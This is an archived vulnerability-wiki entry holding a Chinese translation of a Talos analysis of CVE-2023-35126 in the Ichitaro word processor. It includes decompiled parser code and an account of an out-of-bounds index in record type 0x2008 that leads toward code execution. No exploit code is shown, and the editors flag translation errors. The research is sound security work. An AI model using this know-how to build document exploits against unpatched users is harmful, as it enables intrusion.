---
source: "gelusus/wxvl 公众号漏洞文库"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "剖析复杂漏洞并在 Ichitaro Word 中实现任意代码执行"
product: "JustSystems Ichitaro CVE-2023-35126 / TALOS-2023-1825"
record_type: "analysis"
document_type: "技术文章（细分类待核）"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "产品Ichitaro不是Microsoft Word，测试Ichitaro2023 1.0.1.59372和2023-10-19修复日期明确，须补厂商精确更新版本/公告；读取恶意jtd须用户打开，依赖32位特定模块无ASLR、可写表及DEP绕过，不能泛化全部现代版本；安全讨论将DEP等同严格W^X、无ASLR等同任意地址可写、一个UAF可利用推所有同类可利用均须限定权限和上下文"
side_effects: "记录2008越界对象索引结合5/7子类型、帧指针覆盖、后续流读取和恢复上下文链有细致反汇编支撑，应保留方法论"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/%E5%89%96%E6%9E%90%E5%A4%8D%E6%9D%82%E6%BC%8F%E6%B4%9E%E5%B9%B6%E5%9C%A8%20Ichitaro%20Word%20%E4%B8%AD%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "missing"
source_note: "原始出处待补；仓库归档不等同原始披露"
id: "vw-b4bd1241a97ece333b2bbe61"
entity_id: "ve-b4bd1241a97ece333b2bbe61"
schema_version: "1"
---

# 剖析复杂漏洞并在 Ichitaro Word 中实现任意代码执行

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：JustSystems Ichitaro CVE-2023-35126 / TALOS-2023-1825
- 文献类型：技术文章（细分类待核）
- 版本、权限及部署边界：产品Ichitaro不是Microsoft Word，测试Ichitaro2023 1.0.1.59372和2023-10-19修复日期明确，须补厂商精确更新版本/公告；读取恶意jtd须用户打开，依赖32位特定模块无ASLR、可写表及DEP绕过，不能泛化全部现代版本；安全讨论将DEP等同严格W^X、无ASLR等同任意地址可写、一个UAF可利用推所有同类可利用均须限定权限和上下文
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 主35126缺元数据，34366/38127/38128为同类背景不是本链必需
2. 产品Ichitaro不是Microsoft Word，测试Ichitaro2023 1.0.1.59372和2023-10-19修复日期明确，须补厂商精确更新版本/公告
3. 读取恶意jtd须用户打开，依赖32位特定模块无ASLR、可写表及DEP绕过，不能泛化全部现代版本
4. 记录2008越界对象索引结合5/7子类型、帧指针覆盖、后续流读取和恢复上下文链有细致反汇编支撑，应保留方法论
5. 大量专有IDA接口/重命名含括号变量属伪代码且所需扩展环境未说明，完整exploit明确不公开不算丢失
6. StackReceiver初始化self.__sender但只定义sender，receive_word(dyn.block(adjust)))多闭合括号，示例代码有确定错误
7. 开头0x3C1FAF0F被称parseStream3a76be后文实际processStreams77af0f地址，0x42缓冲界限/0x46记录大小及负0x1088栈调整翻译混杂应按原文校对
8. 安全讨论将DEP等同严格W^X、无ASLR等同任意地址可写、一个UAF可利用推所有同类可利用均须限定权限和上下文
9. Talos/JP CERT评分争议有具体向量却未链接任一原报告，引用MS-CFB/工具/政策均仅文字，缺最重要原英文研究URL
10. 末尾推广可移除，避免把未公开完整代码当审计已验证RCE

### 操作风险

记录2008越界对象索引结合5/7子类型、帧指针覆盖、后续流读取和恢复上下文链有细致反汇编支撑，应保留方法论

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原始披露 URL 未确认；既有归档来源标签保留，不能替代原始公告

### 归档技术正文

 Ots安全   2024-03-28 12:09  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
1. Cisco Talos 去年披露了 JustSystems 的 Ichitaro 文字处理器中的多个漏洞。这些漏洞非常复杂，是通过广泛的逆向工程发现的。  
  
1. CVE-2023-35126及其同类（ CVE-2023-34366、 CVE-2023-38127和CVE-2023-38128）均被评估为可利用，有可能实现任意代码执行。  
  
1. 为了建立优先级，仅使用 CVE-2023-35126 提供的有限原语开发了完整的任意代码执行漏洞，与 JP CERT 的评估相比，证明了其严重性。  
  
1. 这样做需要深入了解复杂的文件格式以及 Ichitaro 实现的内部机制，反映潜在恶意对手为实现相同目标所需执行的利用研究。   
  
1. 该漏洞将越界索引转换为帧指针覆盖。静默执行有效负载后，进程将被修复，从而允许应用程序完成加载文档的其余部分。进程的无声继续执行至关重要，以免引起目标受害者的警觉。  
  
1. 其有效负载与漏洞明显分离，并且可以从构建时指定的任意文档流中进行解码。开发和演示的工具和技术将帮助我们更好地评估和更快地了解未来的类似威胁。   
  
1. 我们不再发布完整的漏洞利用代码，但我们认为展示开发异常漏洞利用程序的复杂性并强调漏洞利用缓解措施的重要性非常重要。  
  
JustSystems, Inc. 的 Ichitaro 字处理组件软件是该公司更大的办公产品套件的一部分，类似于 Microsoft Office 365。虽然在世界其他地区不太知名，但它在日本拥有很大的市场份额。这些类型的应用程序在区域内很受欢迎，但经常被忽视，以前一直是恶意利用活动的目标。思科 Talos 在过去一年中进行的漏洞研究发现了 Ichitaro 中的多个高严重性漏洞，这些漏洞可能允许攻击者执行各种恶意操作，包括任意代码执行。 JustSystems 已修补本博文中提到的所有漏洞，所有这些均遵守思科的第三方供应商漏洞披露政策。  
  
  
直接的模糊测试对于这些类型的应用程序大多无效。复杂文件格式支持的复杂功能需要广泛的逆向工程，从而更深入地了解 Ichitaro 的内部工作原理，这对于有效地寻找错误是必要的，无论是通过模糊测试还是手动代码审计。这些见解有助于我们更好地评估未来发现的漏洞的严重性。  
  
  
发现的漏洞通常很复杂，难以触及和触发。目前，我们将重点关注一个漏洞，特别是TALOS-2023-1825 (CVE-2023-35126)。出于演示目的，我们使用 Ichitaro 2023 版本 1.0.1.59372。 JustSystems在安全更新中修补了此漏洞2023.10.19。我们的重点是执行根本原因和可利用性分析时所采用的方法。  
  
  
除了简单的概念证明之外，开发内存损坏漏洞有时非常耗时，因此不能掉以轻心。随着更先进的漏洞利用缓解措施的出现，评估单个漏洞是否可利用及其严重性变得困难。有用的是利用等价类。在特定上下文中对释放后使用漏洞的利用表明，所有类似的释放后使用漏洞都是可利用的。虽然漏洞利用等价类是为最常见的目标类型（例如浏览器或操作系统内核）建立的，但在处理以前未知的软件类型时，我们没有先例可以依靠。   
  
  
这在判断漏洞的严重性时尤其重要。我们使用CVSS 3.1 评分对该漏洞的评估为 7.8 (CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)，而JP CERT 为其分配了 3.3 (CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L)，因为他们认为这不是任意的可以执行代码。这严重低估了严重性，并给可能忽略安全更新的用户带来不必要的风险。通过演示和确定此漏洞的可利用性，我们的目标是纠正这种情况并澄清我们未来发现的漏洞的可利用性估计。   
  
  
当利用公共目标中的漏洞时，可以采用众所周知的技术，例如在利用JavaScript引擎时依赖众所周知的“addrof/fakeobj”抽象。然而，并非所有目标都允许使用相同的通用技术。在某些情况下，交互性是不可能的，或者漏洞的位置不允许对手影响足够的目标以允许利用。  
  
  
我们剖析了 Ichitaro 中发现的一个漏洞，该漏洞的严重程度似乎有限。利用此漏洞及其所属代码的副作用，我们可以构建更强大的利用原语，最终导致完全任意代码执行。这不仅增强了我们对评估这些漏洞系列的信心，而且记录并演示了进行这项研究所需的构建块、工具和方法。   
  
  
**格式**  
  
Ichitaro 字处理器支持的主要文档类型使用 .jtd 文件扩展名并存储为Microsoft 复合文档。复合文档文件包含由多个内容流组成的分层结构，以及每个内容流的命名信息，这使其看起来像文件系统。主要 API 也由 Microsoft 通过 COM 公开，当用于打开文档时，会返回一个实现IStorage接口的对象。因此，该格式多年来一直被多个 Microsoft 组件（包括 Microsoft Office 套件）使用，并且 Microsoft 在[MS-CFB]：复合文件二进制文件格式中进行了大量记录。  
  
  
使用微软复合文档格式的软件实施者将利用其类似文件系统的功能来存储与文档内容相关的不同流。因此，当要求应用程序加载文档时，应用程序将从文档中读取目录条目列表以提取流名称。然后可以使用这些流名称来访问各个流的内容，然后可以使用这些内容来加载恢复文档所需的部分。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscYSbGFibtgjledf9Jzy8621LdicWibLDWQB1Sbr4k8eEcCiceVIGNAnOkNw/640?wx_fmt=png&from=appmsg "")  
  
根据这种通过名称引用流的逻辑，逆向工程师可以识别模式，并识别二进制文件正在解析特定流的位置。这种模式与标准 API 相结合，可以使逆向工程师识别应用程序中与文档交互的相关部分。  
  
  
利用这些模式，TALOS-2023-1825被发现，然后报告为CVE-2023-35126。当第一次检查空文档文件时，可以在结构存储文档的目录中找到几个流及其名称。将其中一些流名称与加载到二进制文件地址空间中的模块进行交叉引用，我们将得到引用该流名称的单个二进制文件。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscPk9T2ALOccTX8Mq68mNLH8aPiaBK2CpkzZkibjPCZhkT7on6usCsAMPw/640?wx_fmt=png&from=appmsg "")  
  
使用在应用程序生成的文档中找到的默认流名称，可以搜索属于应用程序的每个二进制文件以确定哪些库引用相应的流名称。以下命令演示了此类搜索。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscJvUneCU1K7fpbxnILbiaumOYmHtqYZlG89eOyLMff91dyT9kN6hROHQ/640?wx_fmt=png&from=appmsg "")  
  
一旦识别出正确的二进制文件，就可以简单地交叉引用字符串来识别可用于与相应流交互的候选列表。在下面的屏幕截图中，每个流名称都彼此靠近。识别出候选函数列表后，可以使用该列表通过调试器设置断点，然后用于枚举与解析文档相关的函数。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscaZ8kHkxjW30hCB7pAk1Xm6KxFmpvWbZm34Qick0jopIMnv8QJmRAqicQ/640?wx_fmt=png&from=appmsg "")  
  
  
**发现**  
  
发现相关错误首先要识别流名称的位置，枚举对它们的指令引用，然后找到每个引用共享的公共调用者。这是使用 IDA Python 脚本在下面的屏幕截图中完成的，该脚本获取选定地址的列表，获取每个可执行引用，将每个地址分组为单独的集合，然后找到所有集合的公共交集。这导致单个函数地址负责选定的流名称。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscRAulmeQBZ1fQIO8WrI4SnxicyeJjQYb0OChYs5TsK0p1IDxXCwrFR2A/640?wx_fmt=png&from=appmsg "")  
  
在检查与发现的地址相关的函数后  
0x3BE25803，它似乎引用了从空文档中列出的所有流名称，并用作某种形式的初始化。在将此地址设置断点运行应用程序后，我们的调试器将确认在打开文档时执行此代码。在同一调试会话期间检查回溯可以为我们提供一条简单的路径来识别应用程序如何解析文档中的流。  
  
  
then的函数  
0x3BE25803有一个调用者，  
0x3C1FAF0F可以在我们的反汇编器中导航到该调用者。从该调用者处，它调用的每个函数都可用于标识引用文档中的流名称的其他位置。这是一种常见模式，可用于将每个流名称映射到一个函数，该函数负责解析所述流或初始化稍后在解析流时使用的变量的范围。  
  
```
int __thiscall object_9c2044::parseStream(DocumentViewStyles,DocumentEditStyles)_3a76be(
        object_9c2044 *this,
        JSVDA::object_OFRM *ap_oframe_0,
        int av_documentType_4,
        int av_flags_8,
        int av_whichStream_c,
        _DWORD *ap_result_10)
{
  lp_this_64 = this;
  p_result_10.ap_unkobject_10 = (int)ap_result_10;
  lp_oframe_6c = ap_oframe_0;
  constructor_3a9de4(&lv_struc_38);
  lv_result_4 = 0;
  sub_3BE29547(lv_feh_60, 0xFFFF, 0);
...
  lv_struc_38.v_documentType_8 = av_documentType_4;
  lv_struc_38.v_initialParsingFlags_c = av_flags_8;
  lv_struc_38.p_owner_24 = lp_this_64;
  lv_struc_38.v_initialField(1)_10 = 1;
  lv_position_7c = 4;
  if ( av_whichStream_c == 1 || av_whichStream_c == 3 || av_whichStream_c == 4 )                // Determine which stream name to use
  {
    v9 = "DocumentViewStyles";
  }
  else
  {
...
    v9 = "DocumentEditStyles";
  }
  v10 = object_OFRM::openStreamByName?_132de4(lp_oframe_6c, v9, 16, &lp_oseg_68);               // Open up a stream by a name.
  if ( v10 != 0x80030002 )
  {
...
    *(_QWORD *)&lp_oframe_70 = 0i64;
    if ( object_OSEG::setCurrentStreamPosition_1329ce(lp_oseg_68, 0, 0, 0, 0) >= 0              // Read a two 16-bit integers for the header
      && object_OSEG::read_ushort_3a7664(lp_oseg_68, &lv_ushort_74)
      && object_OSEG::read_ushort_3a7664(lp_oseg_68, &lv_ushort_78) )
    {
      if ( (unsigned __int16)lv_ushort_74 <= 1u )
      {
        lv_struc_38.vw_version_20 = lv_ushort_74;
        lv_struc_38.vw_used_22 = lv_ushort_78;
...
        v12 = 0;
        for ( i = 4; ; lv_position_7c = i )                                                     // Loop to process contents of stream
        {
          v25 = v12;
          v14 = struc_3a9de4::parseStylesContent_3a7048(&lv_struc_38, lp_oseg_68, i, v12, av_whichStream_c, p_result_10, 0);
          v_result_8 = v14;
          if ( v14 == 0xFFFFFFE8 )
            break;
          if ( v14 != 1 )
            goto return(@edi)_3a78dd;
          i = lv_struc_38.v_header_long_4 + 6 + lv_position_7c;
          v12 = ((unsigned int)lv_struc_38.v_header_long_4 + 6i64 + __PAIR64__(v25, lv_position_7c)) >> 32;
        }
        v_result_8 = 1;
      }
...
  return v_result_7;
}
```  
  
  
该清单显示了函数的开头，  
0x3C1FAF0F名称为  
object_9c2044::parseStream(DocumentViewStyles,DocumentEditStyles)_3a76be。该函数引用  
DocumentViewStyles流。具体来说，  
DocumentViewStyles和  
DocumentEditStyles字符串都是相邻引用的，仅由条件分隔开。因此，两个流可能使用相同的实现来解析它们的内容，并且使用参数来区分它们。在同一函数的底部是一个循环，可能用于处理流的可变长度内容。如果我们检查此循环的每次迭代所调用的函数，我们将遇到以下函数，该函数具有合理的复杂性，并且似乎使用 16 位整数作为键来处理一定数量的记录类型。该函数的形状如以下屏幕截图所示。   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscfXUDLD32rlPIXhFs2sGJY8xyt8wTKSjYQiaYLmZTOXDD9oc2IKaawrw/640?wx_fmt=png&from=appmsg "")  
  
以下列表是上一个屏幕截图中解析流中的记录类型的函数的反编译。探索此方法实现的不同情况表明，它负责解析大约 10 种不同的记录类型。大多数用于解析每个单独记录类型的函数都以一个函数开头，该函数确保在处理相应记录之前构造并初始化必要的字段。这意味着与这些字段相关的条件分配只能在每个文档实例中使用一次，并且需要已经被调用以避免在利用过程中留在堆栈上的数据的不可预测性。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdsc4YZGwwYMSmEsGY0a2GNK9PlUCrccjmViabP0LUhEESPeXvZHW885pdQ/640?wx_fmt=png&from=appmsg "")  
  
```
int __thiscall struc_3a9de4::parseStylesContent_3a7048(
        struc_3a9de4 *this,
        JSVDA::object_OSEG *ap_oseg_0,
        int av_position(lo)_4,
        int av_position(hi)_8,
        int av_currentStreamState?_c,
        frame_3a7048_arg_10 ap_unkobjectunion_10,
        frame_3a7048_arg_14 ap_nullunion_14)
{
  lv_result_4 = 0;
  p_oseg_0 = ap_oseg_0;
...
  v_documentType_8 = this->v_documentType_8;
  v_boxHeaderResult_0 = struc_3a9de4::readBoxHeader?_3a6fae(this, ap_oseg_0);
  if ( v_boxHeaderResult_0 != 31 )
  {
...
    vw_header_word_0 = (unsigned __int16)this->vw_header_word_0;                        // Check first 16-bit word from stream
    p_owner_24 = this->p_owner_24;
    lp_owner_8 = p_owner_24;
    if ( vw_header_word_0 > 0x2003 )
    {
      v_wordsub(2004)_0 = vw_header_word_0 - 0x2004;
      if ( v_wordsub(2004)_0 )
      {
        v_word(2005)_0 = v_wordsub(2004)_0 - 1;
        if ( !v_word(2005)_0 )
        {
          if ( av_currentStreamState?_c != 5 ) {                                        // Check for record type 0x2005
            struc_3a9de4::ensureFieldObjectsConstructed??_3a6d8b(this, 0);
            p_styleObject_3a712c = struc_3a9de4::readStyleType(2005)_3a6bec(this, p_oseg_0, this->v_header_long_4, Av_parsingFlagField_8 == 3);
            goto returning(@eax)_endrecord_3a736f;
          }
          goto returning(1)_endrecord_3a70f9;
        }
        v_wordsub(2006)_0 = v_word(2005)_0 - 1;
        if ( v_wordsub(2006)_0 )
        {
          v_word(2007)_0 = v_wordsub(2006)_0 - 1;
          if ( v_word(2007)_0 )
          {
            v_word(2008)_0 = v_word(2007)_0 - 1;
            if ( !v_word(2008)_0 )
            {
...
              if ( p_object_60 )
              {
 
LABEL_93:
                p_styleObject_3a712c = object_9d0d30::readStyleType(2008)_391906(       // Process record type 0x2008
                                         p_object_60,
                                         p_oseg_0,
                                         this->v_header_long_4,
                                         Av_parsingFlagField_8,
                                         this->v_documentType_8,
                                         ap_unkobjectunion_10.ap_unkobject_10,
                                         &lv_result_4);
                goto returning(@eax)_endrecord_3a736f;
              }
              goto returning(@esi)_endrecord_3a7625;
            }
            if ( v_word(2008)_0 == 8 )
            {
...
                p_styleObject_3a712c = object_9d0d30::readStyleType(2010)_392cab(       // Process record type 0x2010
                                         field(64)_6bf3a6,
                                         p_oseg_0,
                                         this->v_header_long_4,
                                         Av_parsingFlagField_8,
                                         this->v_documentType_8,
                                         ap_unkobjectunion_10.ap_unkobject_10,
                                         (int)&lv_result_4);
                goto returning(@eax)_endrecord_3a736f;
              }
              goto returning(@esi)_endrecord_3a7625;
            }
            goto check_pushStream_3a73fe;
          }
...
        }
...
      }
...
      return p_result_3a705e;
    }
    if ( vw_header_word_0 == 0x2003 )
    {
      if ( (Av_parsingFlagField_8 != 3 || ap_unkobjectunion_10.ap_unkobject_10
         && (*(_BYTE *)(ap_unkobjectunion_10.ap_unkobject_10 + 0x204) & 0x40) != 0) && av_currentStreamState?_c != 5 )
      {
        struc_3a9de4::ensureFieldObjectsConstructed??_3a6d8b(this, 0);
        p_field(38)_55 = object_10cbd2::get_field(38)_7b15a6(lp_owner_8->v_data_290.p_object_48, 0);
        p_styleObject_3a712c = object_9bd120::readStyleType(2003)_1d63a3(               // Process record type 0x2003
                                 p_field(38)_55,
                                 p_oseg_0,
                                 this->v_header_long_4,
                                 Av_parsingFlagField_8,
                                 ap_unkobjectunion_10.ap_unkobject_10);
        goto returning(@eax)_endrecord_3a736f;
      }
      goto returning(1)_endrecord_3a70f9;
    }
    v_wordsub(1000)_0 = vw_header_word_0 - 0x1000;
    if ( v_wordsub(1000)_0 )
    {
      v_wordsub(1001)_0 = v_wordsub(1000)_0 - 1;
      if ( !v_wordsub(1001)_0 )                                                         // Process record type 0x1001
      {
...
        p_styleObject_3a712c = object_9e5ffc::readStyleType(1001)_1b8cd2(p_object_190c, p_oseg_0, this->v_header_long_4, 0);
        goto returning(@eax)_endrecord_3a736f;
      }
      v_word(1001)_15 = v_wordsub(1001)_0 - 1;
      if ( !v_word(1001)_15 )                                                           // Process record type 0x1002
      {
        if ( av_currentStreamState?_c != 3 && av_currentStreamState?_c != 4
          && (Av_parsingFlagField_8 != 3 || ap_unkobjectunion_10.ap_unkobject_10
           && (*(_DWORD *)(ap_unkobjectunion_10.ap_unkobject_10 + 516) & 0x100) != 0) )
        {
...
          struc_3a9de4::ensureFieldObjectsConstructed??_3a6d8b(this, 0);
          if ( ap_nullunion_14.object_e7480 )
          {
            p_styleObject_3a712c = object_e7480::readStyleType(1002)_77a7bf(
                                     ap_nullunion_14.object_e7480,
                                     p_oseg_0,
                                     this->v_header_long_4,
                                     v_documentType_8,
                                     Av_parsingFlagField_8,
                                     0);
            goto returning(@eax)_endrecord_3a736f;
          }
        }
        goto returning(1)_endrecord_3a70f9;
      }
      v_wordsub(1fff)_15 = v_word(1001)_15 - 0xFFE;
      if ( v_wordsub(1fff)_15 )
      {
        v_word(2000)_15 = v_wordsub(1fff)_15 - 1;
        if ( !v_word(2000)_15 )                                                         // Process record type 0x2001
        {
          if ( av_currentStreamState?_c == 5 )
          {
            p_field(34)_18 = object_10cbd2::get_field(34)_7b9e07(p_owner_24->v_data_290.p_object_48, 0);
            p_styleObject_3a712c = object_9bd0e4::readStyleType(2001)_1d24a9(
                                     p_field(34)_18,
                                     p_oseg_0,
                                     this->v_header_long_4,
                                     Av_parsingFlagField_8,
                                     this->v_documentType_8,
                                     ap_unkobjectunion_10.ap_unkobject_10);
            goto returning(@eax)_endrecord_3a736f;
          }
          if ( Av_parsingFlagField_8 != 3 || ap_unkobjectunion_10.ap_unkobject_10
            && (*(_BYTE *)(ap_unkobjectunion_10.ap_unkobject_10 + 516) & 0x10) != 0 )
          {
            struc_3a9de4::ensureFieldObjectsConstructed??_3a6d8b(this, 0);
...
            p_field(34)_1f->v_data_4.field_5a8 = 1;
            p_styleObject_3a712c = object_9bd0e4::readStyleType(2001)_1b8f99(
                                     p_field(34)_1f,
                                     p_oseg_0,
                                     this->v_header_long_4,
                                     Av_parsingFlagField_8,
                                     this->v_documentType_8,
                                     lp_unkobject_20,
                                     &lv_result_4);
            goto returning(@eax)_endrecord_3a736f;
          }
returning(1)_endrecord_3a70f9:
          lv_result_4 = 1;
          goto returning(@esi)_skipRecord_3a762b;
        }
        if ( v_word(2000)_15 == 1 )                                                     // Process record type 0x2002
        {
          if ( (Av_parsingFlagField_8 != 3 || ap_unkobjectunion_10.ap_unkobject_10
             && (*(_BYTE *)(ap_unkobjectunion_10.ap_unkobject_10 + 516) & 0x20) != 0)
            && av_currentStreamState?_c != 5 )
          {
            struc_3a9de4::ensureFieldObjectsConstructed??_3a6d8b(this, 0);
            field(3c)_109b2a = object_10cbd2::get_field(3c)_109b2a(lp_owner_8->v_data_290.p_object_48, 0);
            p_styleObject_3a712c = object_9bd184::readStyleType(2002)_1cdcf6(
                                     field(3c)_109b2a,
                                     p_oseg_0,
                                     this->v_header_long_4,
                                     Av_parsingFlagField_8,
                                     ap_unkobjectunion_10.ap_unkobject_10);
            p_result_3a705e = p_styleObject_3a712c;
            goto returning(@esi)_endrecord_3a7625;
          }
          goto returning(1)_endrecord_3a70f9;
        }
...
      }
...
    }
...
    if ( av_currentStreamState?_c == 3 )                                                // Process record type 0x1000
    {
      object_9e5ffc = (object_9e5ffc *)p_object_c->v_data_4.p_object_190c;
      if ( object_9e5ffc )
      {
        p_styleObject_3a712c = object_9e5ffc::readStyleType(1000)_1b6bf7(object_9e5ffc, p_oseg_0, this->v_header_long_4, this);
        goto returning(@eax)_endrecord_3a736f;
      }
    }
    else
    {
      if ( av_currentStreamState?_c == 4 )
      {
        p_styleObject_3a712c = object_9c2044::readStyleType(1000)_4d951d(
                                 p_owner_24,
                                 p_oseg_0,
                                 this->v_header_long_4,
                                 (frame_3a7048_arg_10)ap_unkobjectunion_10.ap_unkobject_10);
        goto returning(@eax)_endrecord_3a736f;
      }
...
    }
    struc_3a9de4::ensureFieldObjectsConstructed??_3a6d8b(this, 0);
    object_9e5ffc = ap_nullunion_14.object_9e5ffc;
    goto readStyleType(1000)_3a7365;
  }
  return 0xFFFFFFE8;
}
```  
  
  
反编译中列出的第一组条件导致记录类型的解析器  
0x2005。第二种情况，根据反编译，用于解析记录类型  
0x2008。正是这种记录类型包含了本文档所利用的全部漏洞。  
  
  
下一个清单显示了记录类型的解析器  
0x2008。在其中，由于初始化它的循环，我们可以立即发现静态大小的数组。仔细查看对该数组的引用后，该函数使用索引来访问数组的元素，而不检查其边界。从数组中获取项目后，立即将该项目写入。因此，由于该越界索引用于写入常量大小的数组，因此它变得更加有用。  
  
```
int __thiscall object_9d0d30::readStyleType(2008)_391906(
        object_9d0d30 *this,
        JSVDA::object_OSEG *ap_oseg_0,
        int av_size_4,
        int av_someFlag_8,
        int av_documentType_c,
        int ap_nullobject_10,
        int *ap_unusedResult_14)
{
...
  v34 = 0;
  p_object_14 = this->v_data_20.p_object_14;
...
  v9 = JSFC::malloc_181e(sizeof(object_9d14a0));
...
  if ( v9 )
    v10 = object_9d14a0::constructor_38cb12(v9, this->v_data_20.p_object(9c2044)_c, this);
...
  this->v_data_20.p_object_14 = v10;
  object_9d14a0::addSixObjects_38cb7d(v10);
  for ( i = 0; i < 6; ++i )                                                                     // Loop for an array with a static length
    lv_objects(6)_6c[i] = object_9d14a0::getPropertyForItemAtIndex_37a71d(this->v_data_20.p_object_14, i);
...
  while ( lvw_case_84 != 0xFFFF )                                                               // Keep reading records until 0xFFFF
  {
    switch ( lvw_case_84 )
    {
      case 0u:                                                                                  // Case 0-4,6,8,9 are similar.
        if ( !arena_reader::read_header_779756(&lv_triple_80, &lv_size_74, &lvw_index_70) )
          goto LABEL_47;
        LOWORD(lv_size_74) = lv_size_74 - 2;
        if ( !arena_reader::read_ushort_779780(&lv_triple_80, &v25) )
          goto LABEL_47;
        lv_objects(6)_6c[lvw_index_70]->v_data_20.v_typeField(0)_14 = v25;
        goto LABEL_51;
...
      case 5u:                                                                                  // Case 5
        if ( !arena_reader::read_header_779756(&lv_triple_80, &lv_size_74, &lvw_index_70) )
          goto LABEL_47;
        LOWORD(lv_size_74) = lv_size_74 - 2;
...
        wstringtoggle_7fb182::initialize_7fb182(&v15, lv_wstring(28)_54);
        LOBYTE(v34) = 0;
        object_9d15a0::moveinto_field(20,2c)_6c0780(lv_objects(6)_6c[lvw_index_70], v15);
        goto LABEL_51;
...
      case 7u:                                                                                  // Case 7
        if ( !arena_reader::read_header_779756(&lv_triple_80, &lv_size_74, &lvw_index_70) )
          goto LABEL_47;
        lv_size_74 += 0xFFFC;
        if ( !arena_reader::read_int_6b5bc1(&lv_triple_80, &v17) )
          goto LABEL_47;
        lv_objects(6)_6c[lvw_index_70]->v_data_20.v_typeField(7)_38 = v17;
        goto LABEL_51;
...
      default:
        if ( !arena_reader::read_ushort_779780(&lv_triple_80, &lv_size_74) )
          goto LABEL_47;
        break;
    }
    while ( lv_size_74 )
    {
      if ( !arena_reader::read_byte_405b6c(&lv_triple_80, &lvb_85) )
        goto LABEL_47;
      lv_size_74 += 0xFFFF;
    }
...
  }
...
}
```  
  
  
索引用于引用对象指针数组中的正确元素。该对象 的大小  
object_9d15a0为  
0x68字节，主要由用于存储从当前流读取的数据的整数字段组成。因此，该漏洞使我们能够根据解析期间读取的情况将数据写入对象的字段之一。单独检查每种情况，可以通过三种方式将实现写入  
object_9d15a0.  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscGn4AroNxSPSWicOdiazhBAmmdaMxwmfTiapQ7m36xCXGDfd3Aqb7ibyQmw/640?wx_fmt=png&from=appmsg "")  
  
第一类涉及从索引对象取消引用指针，然后将 16 位整数零扩展为 32 位写入指针的目标。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscJiagC8IpVOcHbqyRug44q5iaiahdeRgLibXDiaHicaeiaT6pcLJERHfxp26Zg/640?wx_fmt=png&from=appmsg "")  
  
第二类还涉及取消引用指针，但允许我们将 32 位整数写入指针的目标。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscyWsiaq2gqmicPJEbib0wGDicliaHDkAzEicVupV8YPs65eAPBGatqEnEYhPA/640?wx_fmt=png&from=appmsg "")  
  
第三类稍微复杂一些，但它似乎编写了对某种短对象的引用，该对象包含一个可以设置为1or 的整数2，以及一个可以根据该整数的值释放的指针。在这三类中，32 位整数写入似乎是最有用的，除非我们计划写入高 16 位始终被清除的长度。  
  
  
在取消引用任何这些类的指针后，将从流中解码的整数写入取消引用的对象内的字段。单独检查每个字段可以准确地告诉我们对象的哪个字段将被写入。看起来，根据我们选择的情况，解码后的整数最终将被写入对象的范围+0x34内。+0x60由于只有 32 位整数和可能的短对象情况似乎有用，因此我们将记下它们写入的字段，并使用该字段来查找有用的内容以进行覆盖。具体来说，我们注意到短对象类型正在使用 case  
0x5并将导致写入 offset +  
0x4c，而 case 的 32 位整数类型  
0x7最终将写入 offset   
+0x58。  
  
```
Python>struc.by('object_9d15a0').members
<class 'structure' name='object_9d15a0' size=0x68>
[0]  0+0x4                     int 'p_vftable_0' (<class 'int'>, 4)     # [vftable] 0x3c4515a0
[1]  4+0x1c JSFC::CCmdTarget::data 'v_data_4'    <class 'structure' name='JSFC::CCmdTarget::data' offset=0x4 size=0x1c>
[2] 20+0x48    object_9d15a0::data 'v_data_20'   <class 'structure' name='object_9d15a0::data' offset=0x20 size=0x48>
 
Python>struc.by('object_9d15a0').members[2].type.members
<class 'structure' name='object_9d15a0::data' offset=0x20 size=0x48>
[0]  20+0x4                  int 'p_vftable_0'             (<class 'int'>, 4)
[1]  24+0x4                  int 'p_vftable_4'             (<class 'int'>, 4)
[2]  28+0x2              __int16 'field_8'                 (<class 'int'>, 2)
[3]  2a+0x2              __int16 'field_A'                 (<class 'int'>, 2)
